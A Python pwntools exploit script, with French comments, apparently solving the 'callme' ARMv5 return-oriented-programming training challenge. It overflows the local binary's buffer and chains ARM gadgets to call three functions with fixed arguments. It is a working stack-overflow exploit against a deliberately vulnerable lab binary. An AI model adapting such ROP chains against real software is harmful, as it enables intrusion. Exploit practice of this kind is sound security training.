#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('callme_armv5')

# 64 : read
# 84 : ret
gs='''
b *pwnme+84
c
'''

# pop {r3, pc}
g_popr3 = 0x000108dc          
# 0x00010870 : pop {r0, r1, r2, lr, pc}
g_pop_r012 = 0x00010870

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)


io.recvuntil(b"> ")

#print(elf.symbols)
callme_one = elf.plt["callme_one"]
callme_two = elf.plt["callme_two"]
callme_three = elf.plt["callme_three"]

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

offset=0x20

PL=b"A"*offset
PL+=p32(1)              # Pour fp

for adrcall in [callme_one, callme_two, callme_three ]:
    PL+=p32(g_pop_r012)
    PL+=p32(0xdeadbeef)     # r0
    PL+=p32(0xcafebabe)     # r1
    PL+=p32(0xd00df00d)     # r2
    PL+=p32(g_popr3)        # lr adresse de retour de callme
    PL+=p32(adrcall)
    PL+=p32(3)              # pour le r3 de pop {r3,pc}

io.sendline(PL)
io.interactive()

